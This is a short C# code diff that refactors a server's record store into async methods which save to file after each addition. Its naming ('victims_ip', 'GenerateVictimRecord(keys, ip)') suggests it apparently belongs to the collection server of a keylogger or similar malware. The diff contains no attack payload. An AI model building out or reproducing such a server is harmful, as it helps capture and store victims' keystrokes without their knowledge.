@@ -56,7 +56,7 @@ namespace Server.Data
         private static HashSet<string> _victims_ip = new HashSet<string>();
         private static List<RecordData> _records = new List<RecordData>();
 
-        public static void AddRecord(int[] keys, string ip)
+        public static async Task AddRecordAsync(int[] keys, string ip)
         {
             if (!_victims_ip.Contains(ip))
             {
@@ -67,23 +67,36 @@ namespace Server.Data
             lock (_locker) {
                 _records.Add(RecordsGenerator.GenerateVictimRecord(keys, ip));
             }
+            await DataWriterReader.SaveRecordsToFile();
         }
 
-        public static void AddRecord(RecordData record)
+        public static async Task AddRecordAsync(RecordData record)
         {
             if (record.Id <= RecordsGenerator.GlobalId)
                 RecordsGenerator.SetNewId(record);
             else
                 RecordsGenerator.GlobalId = record.Id;
+
+            if (!_victims_ip.Contains(record.Ip))
+            {
+                lock (_locker)
+                    _victims_ip.Add(record.Ip);
+            }
+            lock (_locker)
+            {
+                _records.Add(record);
+            }
+            await DataWriterReader.SaveRecordsToFile();
         }
 
-        public static List<VictimRecord> GetRecordsList()
+        public static List<RecordData> GetRecordsList()
         {
             return _records
                 .AsParallel()
-                .Select(r => (VictimRecord)r.Clone())
+                .Select(r => (RecordData)r.Clone())
                 .ToList();
         }
+
 
         public static List<string> GetVictimsIps()
         {
